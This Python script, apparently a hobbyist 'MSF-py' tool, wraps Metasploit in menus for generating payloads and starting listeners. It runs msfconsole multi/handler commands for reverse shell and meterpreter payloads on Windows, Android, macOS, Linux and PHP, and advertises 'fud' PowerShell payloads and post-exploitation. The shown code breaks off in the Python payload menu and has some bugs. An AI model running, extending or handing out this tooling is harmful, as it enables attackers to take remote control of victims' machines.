#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
#                        MSF-PY  ------> Dj3bB1rAn0n & B1ack                               |
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
 
__Authors__ = " B14ck && Dj3Bb1RaN0n "
 
###############    IMPORTS       ##############

import os,sys
from sys import version_info
import socket

###############  PYTHON 3.x NEEDED  ###############

if version_info<(3,0,0):
    print("Welcom to: " + sys.argv[0])
    print('[\033[31m!\033[0m] Please use Python 3. \033[31m$\033[0m python3 MSF-PY.py')
    exit(0)
try :  
    import subprocess
except Exception as err:
    os.system("clear && clear")
    print(err)
    print("")
    print("Installing subprocess Module")
    os.system("pip3 install subprocess")

import urllib.request
import platform
from time import sleep
################ CLASS BEGINING ################
class begining :

    def __init__(self):
        self.end = '\033[0m' # end
        self.red = '\033[31m' # red
        self.green = '\033[32m' # green
        self.orange = '\033[33m' # orange
        self.blue = '\033[34m' # blue
        self.purple = '\033[35m' # purple
        self.white = "\x1b[97m" #end white
        self.redf = '\033[41m'#redf
        self.yellow = '\033[93m' #yellow
###############   SLOW PRINT1   ################
    def slowprints1(self , slow):
        for slowprint in slow +"\n":
            sys.stdout.write(slowprint)
            sys.stdout.flush()
            sleep(3./90)
###############   SLOW PRINT2   ################
    def slowprints2(self , slow):
        for slowprint1 in slow +"\n":
            sys.stdout.write(slowprint1)
            sys.stdout.flush()
            sleep(2./800)
 
    def ext(self):
        con= str(input(begining.white + ">>[C]ontinue or [E]xit : " + begining.end))
        contu = [
                  "E",
                  "e",
                  "Exit",
                  KeyboardInterrupt
                ]
        if con in contu :
            begining.os_clear()
            begining.slowprints1(begining.red + "[!] Exiting" + begining.end)
            sleep(1)
            sys.exit(0)
        else:
            begining.menu()
            work.works()
           
    def os_clear(self):
        try:
            import platform
        except ModuleNotFoundError:
            print("The platfrom Module not found please download it")
        if "Linux" in platform.system():
            os.system("clear && clear")
        else:
            begining.slowprints1(begining.red + "[!] This tool is not aviable yet for this Os" + begining.end)
            begining.slowprints1(begining.red + "[!] Linux Distros Required" + begining.end)
            pass
   
    def internet_checker(self):
        try :
            import urllib.request
        except Exception as e :
            begining.os_clear()
            print("e")
            return("This module is already imported")
            pass
        try:
            urllib.request.urlopen("http://goolge.com")
            while True:
                begining.os_clear()
                begining.slowprints1( begining.white + "[*] Checking the internet connection ......" + begining.end )
                sleep(2)
                begining.slowprints1( begining.green + "[+] Connected !!" + begining.end )
                sleep(0.2)
                print( begining.red + "\t \t    {#} B14ck {#} && {#} Dj3Bb1RaN0n {#}" + begining.end )
           
                print( begining.green + '''
 | |_________________________________
 | |////////////////                |
 | |////////////////                |
 | |////////////////                |
 | |/////////////a$$$$$e.           |
 | |////////////$$P/_ ,i`           |
 | |///////////$$$//\$$$>,          |
 | |///////////$$$///'\$            |    
 | |///////////\$$a/   `,           |
 | |/////////////"$$$$P"            |
 | |////////////////                |
 | |////////////////                |
 | |////////////////                |
 | |mt-2"""""""""""""""""""""""""""""
''' + begining.end )
                sleep(2)
                begining.slowprints1( "[*] Loading the script ......")
                sleep(2)
                begining.slowprints1( "[+] The script is ready")
                break;
                begining.os_clear()
        except urllib.error.URLError as msg :
            begining.os_clear()
            begining.slowprints1( begining.white + " [*] Checking the internet connection ......" + begining.end)
            sleep(2)
            print( begining.orange + '''
\t \t   ____                   _  __
\t \t  / __/______  ________  (_)/_/
\t \t / _// __/ _ \/ __/ __/ _ / /  
\t \t/___/_/  \___/_/ /_/   (_) /  
\t \t                         |_|  
''' + begining.end )          
            print(" ")
            begining.slowprints1( begining.red + " [!] Sorry there is no internet connection ! !" + begining.end)
            print("\t")
            sleep(0.5)
            begining.slowprints1( begining.red + " [!] Checke your internet connection then run the script again" + begining.end )
            print(" ")
            begining.slowprints1( begining.red + " [!] Exiting" + begining.end )
            sleep(1)
            sys.exit(0)
            begining.os_clear()
            return
 
    def Root(self):
        print('\33[8;28;58t')
        try:
            su = os.getuid()
            if su != 0:
                sleep(1)
                print(begining.red + "\t \t [X] Root           [FAIL]")
                sleep(1)
                print("")
                print(" [!] Must Be Root To Run This Script"+begining.end )
                exit(1)
            else:
                sleep(1)
                print(begining.green + "\t \t [\033[33m\u2713\033[0m\033[32m] Root           [FOUND]"+begining.end )
                print("")
        except Exception as e:
            return(str(e))
 
    def Xterm(self):
        print('\33[8;28;58t')
        try:
            xt = os.path.exists("/usr/bin/xterm")
            if xt == True:
                sleep(1)
                print(begining.green+"\t \t [\033[33m\u2713\033[0m\033[32m] Xterm          [FOUND]"+begining.end)
                print("")
            else:
                sleep(1)
                print(begining.red+"\t \t [X] Xterm          [FAIL]"+begining.end)
                print("")
                sleep(1)
                print(" Intsalling Xterm on Your System ")
                print("")
                os.system("apt install xterm -y")
        except :
            sleep(1)
            print(begining.red+"[!] Error ;(")
            exit(1)
 
    def MetaS(self):
        print('\33[8;28;58t')
        try:
            msf = os.path.exists("/usr/bin/msfconsole")
            if msf == True:
                sleep(1)
                print(begining.green+"\t \t [\033[33m\u2713\033[0m\033[32m] Metasploit     [FOUND]"+begining.end)
                sleep(2)
                print("")
            else:
                sleep(1)
                print(begining.red+"\t \t [X] Metasploit     [FAIL]")
                print("")
                sleep(1)
                print ("\t [!] Must Download Metasploit To Continue"+begining.end)
                print("")
                exit(1)
        except Exception as err:
            return(err)
 
    def Linux(self):
        print('\33[8;28;58t')
        try:
            linux = platform.system()
            if not "Linux" in linux:
                sleep(1)
                print(begining.red+"\t \t [X] Linux / Unix Distros Required"+begining.end)
                exit(127)
            else:
                sleep(1)
                begining.os_clear()
                print(begining.green + "Checking dependencies : " + begining.end)
                sleep(1)
                print("")
                print(begining.green+"\t \t [\033[33m\u2713\033[0m\033[32m] Linux          [FOUND]"+begining.end)
                print("")
        except OSError as msg:
            return(msg)
 
    def services(self):
        print("")
        begining.slowprints1(begining.green+"[+] Starting Metasploit Database "+begining.end)
        print("")
        os.system("msfdb init")
        os.system("msfdb start")
        print("")
        begining.slowprints1(begining.green+"[+] Starting Postgresql Service "+begining.end)
        print("")
        os.system("service postgresql start")
        sleep(2)
 
    def ExT(self):
            begining.slowprints1(begining.red+"[!] Shutting Down Serives ...")
            print("")
            os.system("service postgresql stop")
            os.system("msfdb stop")
            begining.slowprints1(begining.green+"[+] Cleaning ...")
            os.system("apt clean")
            sys.exit(2)
 
 
    def menu(self):
        begining.os_clear()
        print('\33[8;30;83t')
        begining.os_clear()
        ####### BANNER #########
        print(begining.red + '''
\t \t\u2588\u2580\u2584\u2580\u2588    \u2584\u2584\u2584\u2584\u2584   \u2584\u2588\u2588\u2588\u2588  \u2588 \u2584\u2584 \u2580\u2584    \u2584
\t \t\u2588 \u2588 \u2588   \u2588     \u2580\u2584 \u2588\u2580   \u2580 \u2588   \u2588  \u2588  \u2588  
\t \t\u2588 \u2584 \u2588 \u2584  \u2580\u2580\u2580\u2580\u2584   \u2588\u2580\u2580    \u2588\u2580\u2580\u2580    \u2580\u2588  
\t \t\u2588   \u2588  \u2580\u2584\u2584\u2584\u2584\u2580    \u2588      \u2588       \u2588    
\t \t   \u2588              \u2588      \u2588    \u2584\u2580    
\t \t  \u2580                \u2580      \u2580          
\t \t            \033[33mv 0.1
\t \x1b[97m{\033[32m--\x1b[97m}\x1b[97mMSF-py is Payload Generator and Exploiting Tool\x1b[97m{\033[32m--\x1b[97m}
\t \x1b[97m{\033[32m--\x1b[97m} \033[31m C0ded By : \033[32m\033[41mDj3Bb1RaN0n && B14ck\033[0m              \x1b[97m{\033[32m--\x1b[97m}
\t \x1b[97m{\033[32m--\x1b[97m} \033[31m Version  : \033[32m 0.1                              \x1b[97m{\033[32m--\x1b[97m}
\t \x1b[97m{\033[32m--\x1b[97m} \033[31m Folow us on gitub : \033[32mDjebbarAnon , Black15    \x1b[97m{\033[32m--\x1b[97m}
\t \x1b[97m{\033[32m--\x1b[97m} \033[31m        GREETZ TO ALL ALGERIAN H1CK4RS        \x1b[97m{\033[32m--\x1b[97m}
\t \x1b[97m\-----------------------------------------------------/
 ''' + begining.end )
        print("\033[33m#### [ \x1b[97m1 \033[33m] \033[32mPayloads \t \t         {Generate msfvenom payloads} ")
        print("\033[33m#### [ \x1b[97m2 \033[33m] \033[32mListeners \t \t         {Listen For Payloads} ")
        print("\033[33m#### [ \x1b[97m3 \033[33m] \033[32mGo into msfconsole \t \t {Open msfconsole} ")
        print("\033[33m#### [ \x1b[97m4 \033[33m] \033[32mCheck Your INFO      \t {View Your External} ")
        print("\033[33m#### [ \x1b[97m5 \033[33m] \033[32mPowershell attack      \t {Generate fud powershell msfvenom payload}")
        print("\033[33m#### [ \x1b[97m6 \033[33m] \033[32mExploits \t \t \t {msfconsole exploits} ")
        print("\033[33m#### [ \x1b[97m7 \033[33m] \033[32mPost \t \t         {After hacking} ")
        print("\033[33m#### [ \x1b[97m8 \033[33m] \033[32mAbout us \t \t         {Github,youtube,facebook,Instagram} ")
        print("\033[33m#### [ \x1b[97m9 \033[33m] \033[32mUpdate \t \t         {Update the script} ")
        print("\033[33m#### [ \x1b[97m0 \033[33m] \033[32mExit \t \t         {Exit the script} ")
        
class work (begining):
    def back(self):
        begining.menu()
        work.works()

    def works(self):
        your_choice = str(input(begining.white + "#> : " + begining.end))
        if your_choice == '3' :
 
            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
            begining.slowprints2("[\u2713] STARTING POSTGRSQL")
            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
            begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
            begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
            begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
            subprocess.Popen(['xterm','-hold','-title','STARTING MSFCONSOLE','-geometry','80x30+2000+0','-e','sudo msfconsole start'])
            begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
            begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
            begining.ext()
           
 
        elif your_choice == '2':
            sleep(1)
            url = "http://ip.42.pl/raw"
            open_u = urllib.request.urlopen(url).read()
            open_u = open_u.decode('utf-8')
            begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
            begining.slowprints1("Listiner Session Options :")
           
            print("")
            host = str(input("LHOST => "))
            port = str(input("LPORT => "))
            begining.slowprints1    ("""
PAYLOADS AVAIBLE :
 
[1] > Windows
[2] > MAC OX
[3] > Linux
[4] > Android
[5] > PHP
[6] > Python
[7] > Ruby
[8] > Java
[9] > apple_ios

[99] > ( Back To Menu )
""")
            payl = str(input("[@: ]>  "))
            cat = ""
            if payl == "1":
               print("""
[1] > windows/shell/reverse_tcp
[2] > windows/meterpreter/reverse_http
[3] > windows/meterpreter/reverse_https
[4] > windows/meterpreter/reverse_tcp
[5] > windows/meterpreter_reverse_http
[6] > windows/meterpreter_reverse_https
[7] > windows/meterpreter_reverse_tcp

      [back] > ( Back To Menu )
""")
               
               win = str(input("[:@ ]> "))
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING POSTGRSQL")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING LISTNER")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] LISTENR STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] ALL DONE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               if win == "1":
                   cat = "windows/shell/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "2":
                   cat = "windows/meterpreter/reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "3":
                   cat = "windows/meterpreter/reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "4":
                   cat = "windows/meterpreter/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "5":
                   cat = "windows/meterpreter_reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "6":
                   cat = "windows/meterpreter_reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "7":
                   cat = "windows/meterpreter_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "back" : 
                   begining.menu()
                   work.works()
               else:
                   begining.ext()
               
                   
       
            elif payl == "4":
               print("""
[1] > android/shell/reverse_http
[2] > android/shell/reverse_https
[3] > android/shell/reverse_tcp
[4] > android/meterpreter/reverse_http
[5] > android/meterpreter/reverse_https
[6] > android/meterpreter/reverse_tcp
[7] > android/meterpreter_reverse_http
[8] > android/meterpreter_reverse_https
[9] > android/meterpreter_reverse_tcp

      [back] > ( Back To Menu )
""")          
               andr = str(input("[:@ ]> "))
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING POSTGRSQL")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING LISTNER")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] LISTENR STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] ALL DONE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               if andr == "1":
                   cat = "android/shell/reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "2":
                   cat = "android/shell/reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "3":
                   cat = "android/shell/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "4":
                   cat = "android/meterpreter/reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "5":
                   cat = "android/meterpreter/reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "6":
                   cat = "android/meterpreter/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "7":
                   cat = "android/meterpreter_reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "8":
                   cat = "android/meterpreter_reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif andr == "9":
                   cat = "android/meterpreter_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "back" : 
                   begining.menu()
                   work.works()
               else:
                   begining.ext()
 
            elif payl == "2":
               print("""
[1] > osx/ppc/shell_reverse_tcp
[2] > osx/ppc/shell/reverse_tcp
[3] > osx/x64/meterpreter/reverse_tcp
[4] > osx/x64/meterpreter_reverse_http
[5] > osx/x64/meterpreter_reverse_https
[6] > osx/x64/meterpreter_reverse_tcp
[7] > osx/armle/execute/reverse_tcp
[8] > osx/armle/shell/reverse_tcp
[9] > osx/armle/shell_reverse_tcp

    [back] > ( Back To Menu )
""")          
               osx = str(input("[:@ ]> "))
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING POSTGRSQL")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING LISTNER")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] LISTENR STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] ALL DONE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               if osx == "1":
                   cat = "osx/ppc/shell_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "2":
                   cat = "osx/ppc/shell/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "3":
                   cat = "osx/x64/meterpreter/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back() 
               elif osx == "4":
                   cat = "osx/x64/meterpreter_reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "5":
                   cat = "osx/x64/meterpreter_reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "6":
                   cat = "osx/x64/meterpreter_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "7":
                   cat = "osx/armle/execute/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "8":
                   cat = "osx/armle/shell/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif osx == "9":
                   cat = "osx/armle/shell_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "back" : 
                   begining.menu()
                   work.works()
               else:
                   begining.ext()

            elif payl == "3":
               print("""
[1] > linux/x86/shell/reverse_tcp
[2] > linux/x86/meterpreter_reverse_http
[3] > linux/x86/meterpreter_reverse_https
[4] > linux/x86/meterpreter_reverse_tcp
[5] > linux/x64/shell/reverse_tcp
[6] > linux/x64/meterpreter_reverse_http
[7] > linux/x64/meterpreter_reverse_https
[8] > linux/x64/meterpreter_reverse_tcp

       [back] > ( Back To Menu )
""")          
               linx = str(input("[:@ ]> "))
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING POSTGRSQL")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING LISTNER")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] LISTENR STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] ALL DONE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               if linx == "1":
                   cat = "linux/x86/shell/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif linx == "2":
                   cat = "linux/x86/meterpreter_reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif linx == "3":
                   cat = "linux/x86/meterpreter_reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif linx == "4":
                   cat = "linux/x86/meterpreter_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif linx == "5":
                   cat = "linux/x64/shell/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif linx == "6":
                   cat = "linux/x64/meterpreter_reverse_http"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif linx == "7":
                   cat = "linux/x64/meterpreter_reverse_https"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
               elif linx == "8":
                   cat = "linux/x64/meterpreter_reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif win == "back" : 
                   begining.menu()
                   work.works()
               else:
                   begining.ext()

            elif payl == "5":
               print("""
[1] > php/meterpreter/reverse_tcp

   [back] > ( Back To Menu )

""")          
               php_shell = str(input("[:@ ]> "))
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING POSTGRSQL")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
               begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] STARTING LISTNER")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] LISTENR STARTED")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               begining.slowprints2("[\u2713] ALL DONE")
               begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
               
               if php_shell == "1":
                   cat = "php/meterpreter/reverse_tcp"
                   os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                   work.back()
               elif php_shell == "back":
                   begining.menu()
                   work.works()
               else:
                   work.back()

            elif payl == "6":
                   
                   print("""
[1] > python/shell_reverse_tcp
[2] > python/meterpreter/reverse_tcp

     [back] > ( Black to Menu )

""")
